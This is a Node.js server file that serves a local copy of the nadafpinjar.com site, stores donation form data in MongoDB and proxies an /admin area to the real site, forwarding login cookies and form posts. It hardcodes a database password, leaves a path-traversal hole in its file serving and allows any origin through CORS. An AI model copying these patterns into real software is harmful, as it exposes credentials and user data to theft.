const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const mongoose = require('mongoose');

const PORT = process.env.PORT || 3000;
const BASE_DIR = path.join(__dirname, 'nadafpinjar');
const ORIGINAL_HOST = 'nadafpinjar.com';

// ============================================================
// MongoDB Connection & Donation Model (existing functionality)
// ============================================================
const MONGO_URI = 'mongodb+srv://rakesh_rk:Rakesh2005@faceauth.jvni6bv.mongodb.net/?appName=faceauth';

mongoose.connect(MONGO_URI)
  .then(() => console.log('\n✅ MongoDB Connected successfully'))
  .catch(err => console.error('\n❌ MongoDB Connection Error:', err));

const donationSchema = new mongoose.Schema({
  paymentId: String,
  formType: String,
  amount: Number,
  formData: mongoose.Schema.Types.Mixed,
  date: { type: Date, default: Date.now }
});

const Donation = mongoose.model('Donation', donationSchema);

// ============================================================
// Admin Proxy - Stateless Cookie-Forwarding Client
// ============================================================

// ============================================================
// Admin Proxy - URL Rewriting
// ============================================================
function rewriteHtml(html) {
  let r = html;

  // Rewrite all absolute links to the original domain to point to our proxy /admin
  r = r.replace(/https?:\/\/(www\.)?nadafpinjar\.com/gi, '/admin');

  // Insert <base href="/admin/"> right after <head> for relative URL resolution
  if (!r.includes('<base')) {
    r = r.replace(/<head([^>]*)>/i, '<head$1>\n    <base href="/admin/" />');
  }

  // Rewrite absolute paths: href="/path" or href='/path' → href="/admin/path"
  r = r.replace(/(href|src|action)=(['"])\/((?!\/|admin\/)[^'"]*?)\2/gi, '$1=$2/admin/$3$2');

  // Rewrite window.location or location.href assignments pointing to original paths, preserving quotes
  r = r.replace(/location\.href\s*=\s*(['"])\//g, "location.href=$1/admin/");
  r = r.replace(/window\.location\s*=\s*(['"])\//g, "window.location=$1/admin/");
  r = r.replace(/location\.replace\((['"])\//g, "location.replace($1/admin/");

  // Rewrite $.ajax/fetch URLs starting with /, preserving quotes
  r = r.replace(/url:\s*(['"])\//g, "url:$1/admin/");

  // Fix any double-prefix /admin/admin/
  r = r.replace(/\/admin\/admin\//g, '/admin/');

  // Clean up double slashes under /admin
  r = r.replace(/\/admin\/\/+/g, '/admin/');

  // Fix protocol-relative URLs that got rewritten: /admin// → //
  r = r.replace(/(href|src|action)=(['"])\/admin\/\/\2/g, '$1=$2//$2');

  // Handle logout link - make it go to our proxy logout
  r = r.replace(/href=(['"])([^'"]*?)logout([^'"]*?)\1/gi, 'href=$1/admin/logout$1');

  return r;
}

// ============================================================
// Admin Proxy - Request Handlers
// ============================================================

// Determine Content-Type from file extension
function getContentType(filePath) {
  const ext = path.extname(filePath).toLowerCase();
  const types = {
    '.html': 'text/html', '.css': 'text/css', '.js': 'application/javascript',
    '.json': 'application/json', '.png': 'image/png', '.jpg': 'image/jpeg',
    '.jpeg': 'image/jpeg', '.gif': 'image/gif', '.svg': 'image/svg+xml',
    '.ico': 'image/x-icon', '.woff': 'font/woff', '.woff2': 'font/woff2',
    '.ttf': 'font/ttf', '.eot': 'application/vnd.ms-fontobject',
    '.xml': 'application/xml', '.map': 'application/json',
    '.webp': 'image/webp', '.mp4': 'video/mp4'
  };
  return types[ext] || 'application/octet-stream';
}

function isTextContent(contentType) {
  return contentType && (
    contentType.includes('text/html') ||
    contentType.includes('text/css') ||
    contentType.includes('application/javascript') ||
    contentType.includes('text/javascript') ||
    contentType.includes('application/json') ||
    contentType.includes('text/xml') ||
    contentType.includes('application/xml')
  );
}

// Handle admin proxy requests
async function handleAdmin(req, res) {
  // Set CORS headers for admin proxy
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') { res.writeHead(200); res.end(); return; }

  // Extract the path after /admin/
  let adminPath = req.url.replace(/^\/admin\/?/, '').split('?')[0];
  const queryString = req.url.includes('?') ? req.url.split('?')[1] : '';

  try {
    // Handle logout
    if (adminPath === 'logout' || adminPath.endsWith('/logout')) {
      res.setHeader('Set-Cookie', [
        'ASP.NET_SessionId=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax',
        '.ASPXAUTH=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax'
      ]);
      res.writeHead(302, { 'Location': '/admin/' });
      res.end();
      return;
    }

    const targetPath = adminPath || 'accountsummary';
    const fullPath = queryString ? `/${targetPath}?${queryString}` : `/${targetPath}`;

    const isAsset = targetPath.startsWith('assets/') ||
      targetPath.startsWith('fonts/') ||
      targetPath.match(/\.(css|js|png|jpg|jpeg|gif|svg|woff|woff2|ttf|eot|ico|webp|map)$/i);

    // Buffer body for POST requests
    let bodyBuffer = Buffer.alloc(0);
    if (req.method === 'POST') {
      const chunks = [];
      await new Promise((resolve) => {
        req.on('data', chunk => chunks.push(chunk));
        req.on('end', () => {
          bodyBuffer = Buffer.concat(chunks);
          resolve();
        });
      });
    }

    const reqHeaders = {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Accept': isAsset ? '*/*' : 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language': 'en-US,en;q=0.5',
      'Accept-Encoding': 'identity',
      'Host': ORIGINAL_HOST,
      'Connection': 'keep-alive'
    };

    // Forward browser's Cookie header to the original site
    if (req.headers.cookie) {
      reqHeaders['Cookie'] = req.headers.cookie;
    }

    if (req.method === 'POST') {
      reqHeaders['Content-Type'] = req.headers['content-type'] || 'application/x-www-form-urlencoded';
      reqHeaders['Content-Length'] = bodyBuffer.length;
      reqHeaders['Referer'] = `https://${ORIGINAL_HOST}/${targetPath}`;
      reqHeaders['Origin'] = `https://${ORIGINAL_HOST}`;
    }

    const response = await new Promise((resolve, reject) => {
      const httpsReq = https.request({
        hostname: ORIGINAL_HOST,
        port: 443,
        path: fullPath,
        method: req.method,
        headers: reqHeaders
      }, (httpsRes) => {
        const chunks = [];
        httpsRes.on('data', chunk => chunks.push(chunk));
        httpsRes.on('end', () => {
          resolve({
            statusCode: httpsRes.statusCode,
            headers: httpsRes.headers,
            body: Buffer.concat(chunks)
          });
        });
      });
      httpsReq.on('error', reject);
      if (req.method === 'POST') {
        httpsReq.write(bodyBuffer);
      }
      httpsReq.end();
    });

    // Forward set-cookie headers from original site to browser
    const setCookies = response.headers['set-cookie'];
    if (setCookies) {
      const cookiesToSet = (Array.isArray(setCookies) ? setCookies : [setCookies]).map(c => {
        let clean = c.replace(/Domain=[^;]+;?/gi, '');
        clean = clean.replace(/Path=[^;]+;?/gi, 'Path=/');
        return clean;
      });
      res.setHeader('Set-Cookie', cookiesToSet);
    }

    // Handle redirects
    if (response.statusCode >= 300 && response.statusCode < 400 && response.headers.location) {
      const location = response.headers.location;
      let newLocation;
      if (location.startsWith('http')) {
        try {
          const urlObj = new URL(location);
          if (urlObj.hostname === ORIGINAL_HOST || urlObj.hostname.endsWith(`.${ORIGINAL_HOST}`)) {
            newLocation = `/admin${urlObj.pathname}${urlObj.search}`;
          } else {
            newLocation = location;
          }
        } catch { newLocation = `/admin/${location}`; }
      } else if (location.startsWith('/')) {
        newLocation = `/admin${location}`;
      } else {
        newLocation = `/admin/${location}`;
      }
      res.writeHead(302, { 'Location': newLocation });
      res.end();
      return;
    }

    // Serve assets
    if (isAsset) {
      const ct = response.headers['content-type'] || getContentType(targetPath);
      res.writeHead(response.statusCode, {
        'Content-Type': ct,
        'Cache-Control': 'public, max-age=86400'
      });
      res.end(response.body);
      return;
    }

    // Serve HTML and text content
    const contentType = response.headers['content-type'] || 'text/html';
    if (isTextContent(contentType) && contentType.includes('html')) {
      let html = response.body.toString('utf-8');
      html = rewriteHtml(html);
      res.writeHead(response.statusCode, { 'Content-Type': 'text/html; charset=utf-8' });
      res.end(html);
    } else if (isTextContent(contentType)) {
      let text = response.body.toString('utf-8');
      if (contentType.includes('css')) {
        text = text.replace(/url\(\s*['"]*\//g, "url('/admin/");
        text = text.replace(/\/admin\/admin\//g, '/admin/');
        text = text.replace(/url\('\/admin\/\//g, "url('//");
      }
      res.writeHead(response.statusCode, { 'Content-Type': contentType });
      res.end(text);
    } else {
      res.writeHead(response.statusCode, { 'Content-Type': contentType });
      res.end(response.body);
    }

  } catch (err) {
    console.error('Admin proxy error:', err);
    res.writeHead(502, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(`<h2>Proxy Connection Error</h2><p>${err.message}</p>`);
  }
}

// ============================================================
// MIME types for static file serving
// ============================================================
const mimeTypes = {
  '.html': 'text/html', '.css': 'text/css', '.js': 'application/javascript',
  '.json': 'application/json', '.png': 'image/png', '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg', '.gif': 'image/gif', '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon', '.woff': 'font/woff', '.woff2': 'font/woff2',
  '.ttf': 'font/ttf', '.eot': 'application/vnd.ms-fontobject',
  '.xml': 'application/xml'
};

// ============================================================
// Main HTTP Server
// ============================================================
const server = http.createServer((req, res) => {
  // CORS headers for all requests
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, PATCH, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'X-Requested-With,content-type');

  if (req.method === 'OPTIONS') {
    res.writeHead(200);
    res.end();
    return;
  }

  // ===== Admin Proxy Routes =====
  if (req.url.startsWith('/admin')) {
    handleAdmin(req, res);
    return;
  }

  // ===== Donations API (existing) =====
  if (req.method === 'POST' && req.url === '/api/donations') {
    let body = '';
    req.on('data', chunk => body += chunk.toString());
    req.on('end', async () => {
      try {
        if (!mongoose.connection || mongoose.connection.readyState !== 1) {
          console.log('Reconnecting to MongoDB...');
          await mongoose.connect(MONGO_URI);
        }
        const data = JSON.parse(body);
        const newDonation = new Donation(data);
        await newDonation.save();
        res.writeHead(201, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: true, message: 'Donation saved', id: newDonation._id }));
      } catch (err) {
        console.error('Error saving donation:', err);
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: err.message }));
      }
    });
    return;
  }

  // ===== Static File Serving (existing) =====
  let filePath = req.url === '/' ? '/default.html' : req.url;
  filePath = filePath.split('?')[0];
  const fullPath = path.join(BASE_DIR, filePath);
  const ext = path.extname(fullPath).toLowerCase();
  const contentType = mimeTypes[ext] || 'application/octet-stream';

  fs.readFile(fullPath, (err, content) => {
    if (err) {
      if (err.code === 'ENOENT') {
        res.writeHead(404, { 'Content-Type': 'text/html' });
        res.end('<h1>404 - File Not Found</h1>', 'utf-8');
      } else {
        res.writeHead(500);
        res.end(`Server Error: ${err.code}`, 'utf-8');
      }
    } else {
      res.writeHead(200, { 'Content-Type': contentType });
      res.end(content, 'utf-8');
    }
  });
});

server.listen(PORT, () => {
  console.log(`\n🚀 Server is running on port ${PORT}`);
  console.log(`\n📂 Serving static files from: ${BASE_DIR}`);
  console.log(`\n🔐 Admin proxy available at: /admin/`);
  console.log(`\n🛑 Press Ctrl+C to stop the server\n`);
});
